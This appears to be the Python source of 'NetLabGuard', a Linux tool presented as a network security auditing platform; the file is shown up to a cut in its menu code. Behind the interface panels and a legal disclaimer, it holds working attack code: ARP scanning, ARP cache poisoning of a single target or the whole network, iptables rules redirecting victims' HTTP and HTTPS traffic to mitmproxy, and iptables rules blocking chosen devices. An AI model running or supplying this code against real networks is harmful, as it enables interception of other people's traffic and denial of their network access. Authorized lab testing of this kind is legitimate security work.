#!/usr/bin/env python3
"""
NetLabGuard - Professional Network Security Auditing Toolkit
Enterprise-grade Linux-only offensive-defensive network auditing platform.

LEGAL NOTICE: This tool is intended for authorized security testing,
network administration, and educational purposes only.
"""

import os
import sys
import time
import threading
import subprocess

# import json
import logging
import ipaddress
import socket
from datetime import datetime

# from concurrent.futures import ThreadPoolExecutor
import argparse

# Check platform compatibility
if os.name != "posix" or "linux" not in sys.platform.lower():
    print("❌ ERROR: NetLabGuard is Linux-only. Exiting.")
    sys.exit(1)

try:
    from scapy.all import *
    import netifaces
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.prompt import Prompt, Confirm
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    import rich.traceback

    rich.traceback.install()
except ImportError as e:
    print(f"❌ ERROR: Missing required dependencies: {e}")
    print("Install with: pip3 install scapy netifaces rich")
    sys.exit(1)


class NetLabGuard:
    def __init__(self):
        self.version = "1.0.0"
        self.author = "jusot99"
        self.console = Console()
        self.authorized = False
        self.interface = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_ip = None
        self.network_range = None
        self.targets = []
        self.blocked_devices = []
        self.mitm_active = False
        self.log_file = f"netlabguard_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(self.log_file),
            ],
        )
        self.logger = logging.getLogger(__name__)

    def display_banner(self):
        """Display professional banner with Rich styling"""
        banner_text = """
███╗   ██╗███████╗████████╗██╗      █████╗ ██████╗  ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██║     ██╔══██╗██╔══██╗██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗
██╔██╗ ██║█████╗     ██║   ██║     ███████║██████╔╝██║  ███╗██║   ██║███████║██████╔╝██║  ██║
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║██╔══██╗██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║
██║ ╚████║███████╗   ██║   ███████╗██║  ██║██████╔╝╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
        """

        subtitle = f"Network Security Auditing Platform v{self.version}"
        description = "Enterprise-Grade | Linux-Only | Professional MITM Suite"
        author_line = f"By: {getattr(self, 'author', 'jusot99')}"

        banner_panel = Panel(
            Align.center(
                f"[bold green]{banner_text}[/]\n"
                f"[cyan]{subtitle}[/]\n"
                f"[yellow]{description}[/]\n"
                f"[magenta]{author_line}[/]"
            ),
            box=box.DOUBLE,
            border_style="green",
            title="[bold red]⚡ NETLABGUARD ⚡[/]",
            title_align="center",
        )

        self.console.print(banner_panel)

    def legal_authorization(self):
        """Display legal disclaimer with Rich formatting"""
        disclaimer_content = """
[bold red]LEGAL AUTHORIZATION REQUIRED[/]

NetLabGuard is an enterprise-grade network security auditing platform designed for:
• [green]Authorized penetration testing and security assessments[/]
• [green]Network administration and infrastructure troubleshooting[/]
• [green]Security research in controlled laboratory environments[/]
• [green]Educational cybersecurity training and certification[/]

[bold yellow]⚠️  CRITICAL LEGAL REQUIREMENTS ⚠️[/]

• You [bold]MUST[/] have explicit written authorization to test target networks
• Testing without permission violates multiple laws including:
  - Computer Fraud and Abuse Act (CFAA)
  - Wire Fraud Act and Electronic Communications Privacy Act
  - Local and international cybersecurity regulations

[bold red]BY USING THIS PLATFORM, YOU ACKNOWLEDGE:[/]
• You are legally authorized to perform these security operations
• You will only use this tool on networks you own or have explicit permission
• You understand the legal implications and accept full responsibility
• You agree to use this tool ethically and professionally

[italic]The developers assume no liability for misuse of this platform.[/]
        """

        disclaimer_panel = Panel(
            disclaimer_content,
            box=box.DOUBLE,
            border_style="red",
            title="[bold red]🔒 LEGAL AUTHORIZATION[/]",
            title_align="center",
            padding=(1, 2),
        )

        self.console.print(disclaimer_panel)

        warning_panel = Panel(
            "[yellow]⚠️  This platform performs active network operations that will be detected.\n"
            "⚠️  Ensure you have proper authorization and are in a controlled environment.[/]",
            border_style="yellow",
            title="[bold yellow]⚠️ WARNING[/]",
        )
        self.console.print(warning_panel)

        while True:
            response = Prompt.ask(
                "\n[bold white]Type 'I AGREE' to confirm legal authorization and proceed[/]",
                default="exit",
            )

            if response == "I AGREE":
                self.authorized = True
                self.logger.info("User provided legal authorization")
                self.console.print("\n[green]✓ Legal authorization confirmed[/]")
                break
            elif response.lower() in ["exit", "quit", "no", "n"]:
                self.console.print("[red]❌ Authorization denied. Exiting safely.[/]")
                sys.exit(0)
            else:
                self.console.print(
                    "[red]❌ Invalid response. Type 'I AGREE' to proceed or 'exit' to quit.[/]"
                )

    def check_root_privileges(self):
        """Verify root privileges for network operations"""
        if os.geteuid() != 0:
            error_panel = Panel(
                f"[red]Root privileges required for network operations.\n\n"
                f"Run with: [bold white]sudo python3 {sys.argv[0]}[/][/]",
                border_style="red",
                title="[bold red]❌ PERMISSION ERROR[/]",
            )
            self.console.print(error_panel)
            sys.exit(1)

        self.logger.info("Root privileges confirmed")
        self.console.print("[green]✓ Root privileges verified[/]")

    def detect_network_interface(self):
        """Auto-detect network configuration with enhanced error handling"""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            task = progress.add_task("Analyzing network configuration...", total=None)

            try:
                # Get default gateway interface
                gateways = netifaces.gateways()
                default_gateway = gateways["default"][netifaces.AF_INET]
                self.interface = default_gateway[1]
                self.gateway_ip = default_gateway[0]

                # Get network range and local IP
                interface_info = netifaces.ifaddresses(self.interface)
                ip_info = interface_info[netifaces.AF_INET][0]
                self.local_ip = ip_info["addr"]
                netmask = ip_info["netmask"]

                # Calculate CIDR
                network = ipaddress.IPv4Network(
                    f"{self.local_ip}/{netmask}", strict=False
                )
                self.network_range = (
                    str(network.network_address) + "/" + str(network.prefixlen)
                )

                # Get gateway MAC
                self.gateway_mac = getmacbyip(self.gateway_ip)

                time.sleep(1)  # Simulate analysis time
                progress.stop()

                # Display network information in a professional table
                network_table = Table(title="Network Configuration", box=box.ROUNDED)
                network_table.add_column("Parameter", style="cyan", justify="right")
                network_table.add_column("Value", style="green")
                network_table.add_column("Status", style="yellow", justify="center")

                network_table.add_row("Interface", self.interface, "✓")
                network_table.add_row("Local IP", self.local_ip, "✓")
                network_table.add_row("Gateway IP", self.gateway_ip, "✓")
                network_table.add_row("Gateway MAC", self.gateway_mac or "N/A", "✓")
                network_table.add_row("Network Range", self.network_range, "✓")

                self.console.print(network_table)
                self.logger.info(
                    f"Network detected - Interface: {self.interface}, Range: {self.network_range}"
                )

            except Exception as e:
                progress.stop()
                error_panel = Panel(
                    f"[red]Failed to detect network interface: {str(e)}[/]",
                    border_style="red",
                    title="[bold red]❌ NETWORK ERROR[/]",
                )
                self.console.print(error_panel)
                sys.exit(1)

    def network_discovery(self):
        """Perform comprehensive network discovery with Rich progress tracking"""
        self.console.print("\n[cyan]🔍 Initiating Network Discovery...[/]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            scan_task = progress.add_task(
                "Performing ARP reconnaissance...", total=None
            )

            try:
                # Create ARP request for network range
                arp_request = ARP(pdst=self.network_range)
                broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                arp_request_broadcast = broadcast / arp_request

                # Send packets and receive responses
                answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

                devices = []
                for element in answered_list:
                    device = {
                        "ip": element[1].psrc,
                        "mac": element[1].hwsrc,
                        "vendor": self.get_vendor(element[1].hwsrc),
                        "hostname": self.get_hostname(element[1].psrc),
                    }
                    devices.append(device)

                time.sleep(1)
                progress.stop()

                # Create professional results table
                results_table = Table(
                    title=f"🎯 Network Discovery Results - {len(devices)} Active Devices",
                    box=box.ROUNDED,
                    header_style="bold magenta",
                )

                results_table.add_column("IP Address", style="cyan", justify="center")
                results_table.add_column(
                    "MAC Address", style="yellow", justify="center"
                )
                results_table.add_column("Vendor", style="green")
                results_table.add_column("Hostname", style="blue")
                results_table.add_column("Status", style="red", justify="center")

                for device in devices:
                    status = "🟢 Active"
                    if device["ip"] == self.local_ip:
                        status = "🔵 Local"
                    elif device["ip"] == self.gateway_ip:
                        status = "🟡 Gateway"

                    results_table.add_row(
                        device["ip"],
                        device["mac"],
                        device["vendor"],
                        device["hostname"],
                        status,
                    )

                self.console.print(results_table)

                # Summary panel
                summary_text = (
                    f"[green]✓ Scan completed successfully[/]\n"
                    f"[cyan]📊 {len(devices)} devices discovered[/]\n"
                    f"[yellow]📍 Network range: {self.network_range}[/]"
                )

                summary_panel = Panel(
                    summary_text,
                    border_style="green",
                    title="[bold green]📈 SCAN SUMMARY[/]",
                )
                self.console.print(summary_panel)

                self.targets = devices
                self.logger.info(
                    f"Network discovery completed - {len(devices)} devices found"
                )

            except Exception as e:
                progress.stop()
                self.console.print(f"[red]❌ Network discovery failed: {e}[/]")
                self.logger.error(f"Network discovery error: {e}")

    def get_vendor(self, mac_address):
        """Enhanced vendor identification from MAC address"""
        vendor_prefixes = {
            "00:0c:29": "VMware Inc.",
            "08:00:27": "Oracle VirtualBox",
            "00:50:56": "VMware ESX Server",
            "00:1b:21": "Intel Corporation",
            "00:25:b3": "Apple Inc.",
            "00:26:b9": "Belkin International",
            "00:23:69": "Cisco Systems",
            "00:1f:3c": "Apple Inc.",
            "b8:27:eb": "Raspberry Pi Foundation",
            "dc:a6:32": "Raspberry Pi Foundation",
            "00:15:5d": "Microsoft Corporation",
            "00:03:ff": "Microsoft Corporation",
        }

        prefix = mac_address[:8].lower()
        return vendor_prefixes.get(prefix, "Unknown Vendor")

    def get_hostname(self, ip_address):
        """Attempt to resolve hostname"""
        try:
            hostname = socket.gethostbyaddr(ip_address)[0]
            return hostname
        except:
            return "N/A"

    def select_target(self):
        """Enhanced target selection with Rich interface"""
        if not self.targets:
            self.console.print(
                "[red]❌ No targets available. Run network discovery first.[/]"
            )
            return None

        # Create target selection table
        target_table = Table(
            title="🎯 Target Selection Menu", box=box.ROUNDED, header_style="bold cyan"
        )

        target_table.add_column("ID", style="yellow", justify="center")
        target_table.add_column("IP Address", style="cyan")
        target_table.add_column("MAC Address", style="yellow")
        target_table.add_column("Vendor", style="green")
        target_table.add_column("Hostname", style="blue")
        target_table.add_column("Type", style="magenta")

        # Add "All devices" option
        target_table.add_row(
            "0", "All Devices", "Network-wide", "Multiple", "Multiple", "🌐 Broadcast"
        )

        # Add individual devices
        for i, device in enumerate(self.targets, 1):
            device_type = (
                "🔵 Local"
                if device["ip"] == self.local_ip
                else "🟡 Gateway"
                if device["ip"] == self.gateway_ip
                else "🟢 Target"
            )

            target_table.add_row(
                str(i),
                device["ip"],
                device["mac"],
                device["vendor"],
                device["hostname"],
                device_type,
            )

        self.console.print(target_table)

        while True:
            try:
                choice = Prompt.ask(
                    f"\n[bold white]Select target (0-{len(self.targets)}) or 'back' to return[/]",
                    default="back",
                )

                if choice.lower() == "back":
                    return None

                choice = int(choice)

                if choice == 0:
                    return "all"
                elif 1 <= choice <= len(self.targets):
                    selected = self.targets[choice - 1]
                    if selected["ip"] == self.local_ip:
                        self.console.print(
                            "[yellow]⚠️ Warning: You selected your local machine. This may cause network issues.[/]"
                        )
                        if not Confirm.ask("Continue anyway?"):
                            continue
                    return selected
                else:
                    self.console.print(
                        f"[red]❌ Invalid selection. Choose 0-{len(self.targets)}[/]"
                    )
            except ValueError:
                self.console.print("[red]❌ Please enter a valid number[/]")

    def setup_iptables_mitm(self, target):
        """Setup iptables rules for professional MITM with mitmproxy integration"""
        try:
            self.console.print("[cyan]🔧 Configuring iptables for MITM operation...[/]")

            # Enable IP forwarding
            subprocess.run(
                ["sysctl", "net.ipv4.ip_forward=1"], check=True, capture_output=True
            )

            # Flush existing rules in FORWARD chain
            subprocess.run(
                ["iptables", "-F", "FORWARD"], check=True, capture_output=True
            )

            if target == "all":
                # Network-wide MITM
                self.console.print("[yellow]🌐 Setting up network-wide MITM...[/]")

                # Redirect all HTTP traffic to mitmproxy (excluding local machine)
                subprocess.run(
                    [
                        "iptables",
                        "-t",
                        "nat",
                        "-A",
                        "PREROUTING",
                        "!",
                        "-s",
                        self.local_ip,  # Exclude local machine
                        "-p",
                        "tcp",
                        "--dport",
                        "80",
                        "-j",
                        "REDIRECT",
                        "--to-port",
                        "8080",
                    ],
                    check=True,
                )

                # Redirect all HTTPS traffic to mitmproxy (excluding local machine)
                subprocess.run(
                    [
                        "iptables",
                        "-t",
                        "nat",
                        "-A",
                        "PREROUTING",
                        "!",
                        "-s",
                        self.local_ip,  # Exclude local machine
                        "-p",
                        "tcp",
                        "--dport",
                        "443",
                        "-j",
                        "REDIRECT",
                        "--to-port",
                        "8080",
                    ],
                    check=True,
                )

            else:
                # Single target MITM
                target_ip = target["ip"]
                self.console.print(
                    f"[yellow]🎯 Setting up targeted MITM for {target_ip}...[/]"
                )

                # Redirect HTTP traffic from specific target
                subprocess.run(
                    [
                        "iptables",
                        "-t",
                        "nat",
                        "-A",
                        "PREROUTING",
                        "-s",
                        target_ip,
                        "-p",
                        "tcp",
                        "--dport",
                        "80",
                        "-j",
                        "REDIRECT",
                        "--to-port",
                        "8080",
                    ],
                    check=True,
                )

                # Redirect HTTPS traffic from specific target
                subprocess.run(
                    [
                        "iptables",
                        "-t",
                        "nat",
                        "-A",
                        "PREROUTING",
                        "-s",
                        target_ip,
                        "-p",
                        "tcp",
                        "--dport",
                        "443",
                        "-j",
                        "REDIRECT",
                        "--to-port",
                        "8080",
                    ],
                    check=True,
                )

            # Allow forwarding for intercepted traffic
            subprocess.run(["iptables", "-A", "FORWARD", "-j", "ACCEPT"], check=True)

            self.console.print("[green]✓ iptables rules configured successfully[/]")
            self.logger.info("iptables MITM rules configured")
            return True

        except subprocess.CalledProcessError as e:
            self.console.print(f"[red]❌ Failed to configure iptables: {e}[/]")
            self.logger.error(f"iptables configuration error: {e}")
            return False

    def cleanup_iptables_mitm(self):
        """Clean up iptables MITM rules"""
        try:
            self.console.print("[yellow]🧹 Cleaning up iptables rules...[/]")

            # Flush NAT PREROUTING rules
            subprocess.run(
                ["iptables", "-t", "nat", "-F", "PREROUTING"],
                check=True,
                capture_output=True,
            )

            # Reset FORWARD chain
            subprocess.run(
                ["iptables", "-P", "FORWARD", "ACCEPT"], check=True, capture_output=True
            )
            subprocess.run(
                ["iptables", "-F", "FORWARD"], check=True, capture_output=True
            )

            self.console.print("[green]✓ iptables rules cleaned up[/]")
            self.logger.info("iptables MITM rules cleaned up")

        except subprocess.CalledProcessError as e:
            self.console.print(f"[red]❌ Failed to cleanup iptables: {e}[/]")
            self.logger.error(f"iptables cleanup error: {e}")

    def mitm_attack(self, target):
        """Professional MITM attack with iptables and mitmproxy integration"""
        # Enhanced confirmation panel
        if target == "all":
            target_info = "Entire Network (All Devices)"
            impact = "All network traffic will be intercepted"
        else:
            target_info = f"{target['ip']} ({target['mac']}) - {target['vendor']}"
            impact = "All traffic from this device will be intercepted"

        warning_panel = Panel(
            f"[bold red]⚠️  MITM OPERATION CONFIRMATION ⚠️[/]\n\n"
            f"[yellow]Target: {target_info}[/]\n"
            f"[yellow]Impact: {impact}[/]\n"
            f"[yellow]Method: iptables + mitmproxy on port 8080[/]\n\n"
            f"[red]This will intercept and redirect network traffic.\n"
            f"Ensure you have explicit authorization for this operation.[/]",
            border_style="red",
            title="[bold red]🔒 AUTHORIZATION REQUIRED[/]",
        )

        self.console.print(warning_panel)

        if not Confirm.ask("[bold white]Proceed with MITM operation?[/]"):
            self.console.print("[red]❌ MITM operation cancelled[/]")
            return

        self.logger.warning("MITM attack initiated with user confirmation")

        try:
            # Setup iptables rules
            if not self.setup_iptables_mitm(target):
                return

            # Display mitmproxy instructions
            mitm_instructions = Panel(
                f"[bold green]🚀 MITM Operation Active[/]\n\n"
                f"[cyan]To visualize traffic, run in another terminal:[/]\n"
                f"[bold white]mitmproxy --mode transparent --showhost[/]\n\n"
                f"[yellow]Or for web interface:[/]\n"
                f"[bold white]mitmweb --mode transparent --web-host 0.0.0.0[/]\n\n"
                f"[blue]Traffic is being redirected to port 8080[/]\n"
                f"[red]Press Ctrl+C to stop MITM operation[/]",
                border_style="green",
                title="[bold green]📡 MITM ACTIVE[/]",
            )

            self.console.print(mitm_instructions)

            self.mitm_active = True

            if target == "all":
                # Start ARP spoofing for all targets
                self.start_network_arp_spoofing()
            else:
                # Start ARP spoofing for specific target
                self.start_target_arp_spoofing(target)

            # Keep running until interrupted
            try:
                while self.mitm_active:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass

        except Exception as e:
            self.console.print(f"[red]❌ MITM attack failed: {e}[/]")
            self.logger.error(f"MITM attack error: {e}")
        finally:
            self.stop_mitm_operation()

    def start_network_arp_spoofing(self):
        """Start ARP spoofing for entire network"""

        def arp_spoof_worker():
            while self.mitm_active:
                try:
                    for device in self.targets:
                        if device["ip"] != self.local_ip:  # Don't spoof ourselves
                            self.send_arp_spoof(device["ip"])
                    time.sleep(2)
                except Exception as e:
                    self.logger.error(f"ARP spoofing error: {e}")

        spoof_thread = threading.Thread(target=arp_spoof_worker)
        spoof_thread.daemon = True
        spoof_thread.start()

    def start_target_arp_spoofing(self, target):
        """Start ARP spoofing for specific target"""

        def arp_spoof_worker():
            target_ip = target["ip"]
            while self.mitm_active:
                try:
                    self.send_arp_spoof(target_ip)
                    time.sleep(2)
                except Exception as e:
                    self.logger.error(f"ARP spoofing error for {target_ip}: {e}")

        spoof_thread = threading.Thread(target=arp_spoof_worker)
        spoof_thread.daemon = True
        spoof_thread.start()

    def send_arp_spoof(self, target_ip):
        """Send ARP spoofing packets"""
        try:
            # Tell target that we are the gateway
            arp_response = ARP(
                op=2,  # ARP reply
                pdst=target_ip,
                hwdst=getmacbyip(target_ip),
                psrc=self.gateway_ip,
            )
            send(arp_response, verbose=False)

            # Tell gateway that we are the target
            if self.gateway_mac:
                gateway_spoof = ARP(
                    op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip
                )
                send(gateway_spoof, verbose=False)

        except Exception as e:
            self.logger.error(f"ARP spoof error for {target_ip}: {e}")

    def stop_mitm_operation(self):
        """Stop MITM operation and cleanup"""
        self.console.print("\n[yellow]🛑 Stopping MITM operation...[/]")
        self.mitm_active = False

        # Cleanup iptables rules
        self.cleanup_iptables_mitm()

        # Restore ARP tables
        self.restore_arp_tables()

        self.console.print("[green]✓ MITM operation stopped and network restored[/]")
        self.logger.info("MITM operation stopped")

    def restore_arp_tables(self):
        """Restore legitimate ARP tables"""
        try:
            self.console.print("[cyan]🔧 Restoring legitimate ARP tables...[/]")

            for device in self.targets:
                if device["ip"] != self.local_ip:
                    # Send correct ARP information
                    correct_arp = ARP(
                        op=2,
                        pdst=device["ip"],
                        hwdst=device["mac"],
                        psrc=self.gateway_ip,
                        hwsrc=self.gateway_mac or getmacbyip(self.gateway_ip),
                    )
                    send(correct_arp, verbose=False, count=3)

                    # Restore gateway ARP entry
                    if self.gateway_mac:
                        gateway_restore = ARP(
                            op=2,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac,
                            psrc=device["ip"],
                            hwsrc=device["mac"],
                        )
                        send(gateway_restore, verbose=False, count=3)

            time.sleep(1)
            self.console.print("[green]✓ ARP tables restored[/]")
            self.logger.info("ARP tables restored")

        except Exception as e:
            self.console.print(f"[red]❌ Error restoring ARP tables: {e}[/]")
            self.logger.error(f"ARP restoration error: {e}")

    def block_device(self, target):
        """Professional device blocking with iptables"""
        if target == "all":
            self.console.print("[red]❌ Cannot block entire network[/]")
            return

        target_ip = target["ip"]

        # Check if device is already blocked
        if target_ip in self.blocked_devices:
            self.console.print(f"[yellow]⚠️ Device {target_ip} is already blocked[/]")
            return

        # Confirmation panel
        block_panel = Panel(
            f"[bold red]🚫 DEVICE BLOCKING OPERATION[/]\n\n"
            f"[yellow]Target Device:[/]\n"
            f"  IP: {target_ip}\n"
            f"  MAC: {target['mac']}\n"
            f"  Vendor: {target['vendor']}\n"
            f"  Hostname: {target['hostname']}\n\n"
            f"[red]This will prevent the device from accessing the network.\n"
            f"All traffic to/from this device will be dropped.[/]",
            border_style="red",
            title="[bold red]⚠️ BLOCKING CONFIRMATION[/]",
        )

        self.console.print(block_panel)

        if not Confirm.ask("[bold white]Proceed with device blocking?[/]"):
            self.console.print("[red]❌ Blocking operation cancelled[/]")
            return

        try:
            # Block incoming traffic from device (excluding local machine)
            if target_ip != self.local_ip:
                subprocess.run(
                    ["iptables", "-I", "FORWARD", "1", "-s", target_ip, "-j", "DROP"],
                    check=True,
                )

                # Block outgoing traffic to device (excluding local machine)
                subprocess.run(
                    ["iptables", "-I", "FORWARD", "1", "-d", target_ip, "-j", "DROP"],
                    check=True,
                )

                # Block traffic in INPUT chain (for local services)
                subprocess.run(
                    ["iptables", "-I", "INPUT", "1", "-s", target_ip, "-j", "DROP"],
                    check=True,
                )

                self.blocked_devices.append(target_ip)

                success_panel = Panel(
                    f"[green]✓ Device {target_ip} successfully blocked[/]\n"
                    f"[cyan]All network traffic blocked using iptables rules[/]",
                    border_style="green",
                    title="[bold green]🚫 DEVICE BLOCKED[/]",
                )
                self.console.print(success_panel)
                self.logger.warning(f"Device blocked: {target_ip} ({target['mac']})")
            else:
                self.console.print("[red]❌ Cannot block local machine[/]")

        except subprocess.CalledProcessError as e:
            self.console.print(f"[red]❌ Failed to block device: {e}[/]")
            self.logger.error(f"Device blocking error: {e}")

    def unblock_device(self, target=None):
        """Professional device unblocking with iptables"""
        if not self.blocked_devices:
            self.console.print("[yellow]ℹ️ No devices are currently blocked[/]")
            return

        if target is None:
            # Show blocked devices selection
            blocked_table = Table(
                title="🚫 Currently Blocked Devices",
                box=box.ROUNDED,
                header_style="bold red",
            )
            blocked_table.add_column("ID", style="yellow", justify="center")
            blocked_table.add_column("IP Address", style="red")
            blocked_table.add_column("Status", style="yellow")

            blocked_table.add_row("0", "All Blocked Devices", "🔓 Unblock All")

            for i, blocked_ip in enumerate(self.blocked_devices, 1):
                blocked_table.add_row(str(i), blocked_ip, "🚫 Blocked")

            self.console.print(blocked_table)

            while True:
                try:
                    choice = Prompt.ask(
                        f"\n[bold white]Select device to unblock (0-{len(self.blocked_devices)}) or 'back'[/]",
                        default="back",
                    )

                    if choice.lower() == "back":
                        return

                    choice = int(choice)

                    if choice == 0:
                        # Unblock all devices
                        self.unblock_all_devices()
                        return
                    elif 1 <= choice <= len(self.blocked_devices):
                        target_ip = self.blocked_devices[choice - 1]
                        self.perform_unblock(target_ip)
                        return
                    else:
                        self.console.print(
                            f"[red]❌ Invalid selection. Choose 0-{len(self.blocked_devices)}[/]"
                        )
                except ValueError:
                    self.console.print("[red]❌ Please enter a valid number[/]")
        else:
            # Unblock specific target
            target_ip = target["ip"] if isinstance(target, dict) else target
            if target_ip in self.blocked_devices:
                self.perform_unblock(target_ip)
            else:
                self.console.print(
                    f"[yellow]ℹ️ Device {target_ip} is not currently blocked[/]"
                )

    def perform_unblock(self, target_ip):
        """Perform the actual unblocking operation"""
        try:
            # Remove FORWARD rules
            subprocess.run(
                ["iptables", "-D", "FORWARD", "-s", target_ip, "-j", "DROP"],
                check=True,
                stderr=subprocess.DEVNULL,
            )

            subprocess.run(
                ["iptables", "-D", "FORWARD", "-d", target_ip, "-j", "DROP"],
                check=True,
                stderr=subprocess.DEVNULL,
            )

            # Remove INPUT rule
            subprocess.run(
                ["iptables", "-D", "INPUT", "-s", target_ip, "-j", "DROP"],
                check=True,
                stderr=subprocess.DEVNULL,
            )

            self.blocked_devices.remove(target_ip)

            success_panel = Panel(
                f"[green]✓ Device {target_ip} successfully unblocked[/]\n"
                f"[cyan]Network access restored[/]",
                border_style="green",
                title="[bold green]🔓 DEVICE UNBLOCKED[/]",
            )
            self.console.print(success_panel)
            self.logger.info(f"Device unblocked: {target_ip}")

        except subprocess.CalledProcessError as e:
            self.console.print(f"[red]❌ Failed to unblock device {target_ip}: {e}[/]")
            self.logger.error(f"Device unblocking error: {e}")

    def unblock_all_devices(self):
        """Unblock all currently blocked devices"""
        if not Confirm.ask(
            f"[bold white]Unblock all {len(self.blocked_devices)} devices?[/]"
        ):
            return

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console,
        ) as progress:
            task = progress.add_task(
                "Unblocking all devices...", total=len(self.blocked_devices)
            )

            failed_unblocks = []
            for target_ip in self.blocked_devices.copy():
                try:
                    self.perform_unblock(target_ip)
                    progress.advance(task)
                except Exception as e:
                    failed_unblocks.append(target_ip)
                    self.logger.error(f"Failed to unblock {target_ip}: {e}")

        if failed_unblocks:
            self.console.print(
                f"[yellow]⚠️ Failed to unblock {len(failed_unblocks)} devices: {', '.join(failed_unblocks)}[/]"
            )
        else:
            self.console.print("[green]✓ All devices unblocked successfully[/]")

    def show_blocked_devices(self):
        """Display currently blocked devices"""
        if not self.blocked_devices:
            no_blocks_panel = Panel(
                "[green]No devices are currently blocked[/]",
                border_style="green",
                title="[bold green]🔓 BLOCKING STATUS[/]",
            )
            self.console.print(no_blocks_panel)
            return

        blocked_table = Table(
            title=f"🚫 Blocked Devices ({len(self.blocked_devices)} total)",
            box=box.ROUNDED,
            header_style="bold red",
        )

        blocked_table.add_column("IP Address", style="red")
        blocked_table.add_column("Blocked Since", style="yellow")
        blocked_table.add_column("Status", style="magenta", justify="center")

        for blocked_ip in self.blocked_devices:
            blocked_table.add_row(blocked_ip, "Session Active", "🚫 Active")

        self.console.print(blocked_table)

    def show_system_status(self):
        """Display comprehensive system status"""
        # Network Status
        network_status = Table(title="Network Configuration", box=box.ROUNDED)
        network_status.add_column("Parameter", style="cyan")
        network_status.add_column("Value", style="white")
        network_status.add_column("Status", style="green", justify="center")

        network_status.add_row(
            "Interface",
            self.interface or "Not detected",
            "✓" if self.interface else "❌",
        )
        network_status.add_row(
            "Local IP", self.local_ip or "Not detected", "✓" if self.local_ip else "❌"
        )
        network_status.add_row(
            "Gateway",
            self.gateway_ip or "Not detected",
            "✓" if self.gateway_ip else "❌",
        )
        network_status.add_row(
            "Network Range",
            self.network_range or "Not detected",
            "✓" if self.network_range else "❌",
        )

        # Operation Status
        ops_status = Table(title="Operation Status", box=box.ROUNDED)
        ops_status.add_column("Operation", style="cyan")
        ops_status.add_column("Status", style="white")
        ops_status.add_column("Details", style="yellow")

        ops_status.add_row(
            "MITM Attack",
            "🟢 Active" if self.mitm_active else "🔴 Inactive",
            "Traffic interception running" if self.mitm_active else "Ready to deploy",
        )

        ops_status.add_row(
            "Device Blocking",
            f"🟡 {len(self.blocked_devices)} Blocked"
            if self.blocked_devices
            else "🟢 No Blocks",
            f"{len(self.blocked_devices)} devices blocked"
            if self.blocked_devices
            else "No restrictions active",
        )

        ops_status.add_row(
            "Network Discovery",
            f"🟢 {len(self.targets)} Devices" if self.targets else "🔴 No Scan",
            f"{len(self.targets)} devices discovered"
            if self.targets
            else "Run network discovery",
        )

        # Display tables
        self.console.print(network_status)
        self.console.print(ops_status)

        # System Resources
        try:
            with open("/proc/loadavg", "r") as f:
                load_avg = f.read().strip().split()[:3]

            resources_panel = Panel(
                f"[cyan]System Load:[/] {' '.join(load_avg)}\n"
                f"[cyan]Log File:[/] {self.log_file}\n"
                f"[cyan]Session Duration:[/] Active",
                border_style="blue",
                title="[bold blue]📊 SYSTEM RESOURCES[/]",
            )
            self.console.print(resources_panel)
        except:
            pass

    def show_logs(self):
        """Display recent activity logs with Rich formatting"""
        try:
            log_table = Table(
                title="📋 Recent Activity Logs",
                box=box.ROUNDED,
                header_style="bold blue",
            )
            log_table.add_column("Timestamp", style="cyan")
            log_table.add_column("Level", style="yellow", justify="center")
            log_table.add_column("Message", style="white")

            with open(self.log_file, "r") as f:
                logs = f.readlines()[-15:]  # Show last 15 entries

                for log in logs:
                    try:
                        parts = log.strip().split(" - ", 2)
                        if len(parts) >= 3:
                            timestamp = parts[0]
                            level = parts[1]
                            message = parts[2]

                            # Color code by level
                            level_style = {
                                "INFO": "green",
                                "WARNING": "yellow",
                                "ERROR": "red",
                                "CRITICAL": "bold red",
                            }.get(level, "white")

                            log_table.add_row(
                                timestamp.split(",")[0],  # Remove milliseconds
                                f"[{level_style}]{level}[/]",
                                message,
                            )
                    except:
                        continue

            self.console.print(log_table)

            log_info_panel = Panel(
                f"[cyan]Full log file:[/] {self.log_file}\n"
                f"[cyan]Showing:[/] Last 15 entries\n"
                f"[yellow]Use 'tail -f {self.log_file}' for real-time monitoring[/]",
                border_style="blue",
                title="[bold blue]📄 LOG INFORMATION[/]",
            )
            self.console.print(log_info_panel)

        except Exception as e:
            self.console.print(f"[red]❌ Error reading logs: {e}[/]")

    def show_menu(self):
        """Display professional main menu with Rich styling"""
        while True:
            try:
                # Create menu options
                menu_options = [
                    (
                        "1",
                        "🔍",
                        "Network Discovery",
                        "Scan and identify network devices",
                    ),
                    ("2", "🎯", "Target Selection", "Choose devices for operations"),
                    ("3", "🕵️", "MITM Analysis", "Traffic interception and analysis"),
                    ("4", "🚫", "Block Device", "Restrict network access"),
                    ("5", "🔓", "Unblock Device", "Restore network access"),
                    ("6", "🚫", "Show Blocked", "View blocked devices"),
                    ("7", "📊", "System Status", "View comprehensive status"),
                    ("8", "📋", "View Logs", "Show activity logs"),
                    ("9", "❌", "Exit", "Shutdown NetLabGuard"),
                ]

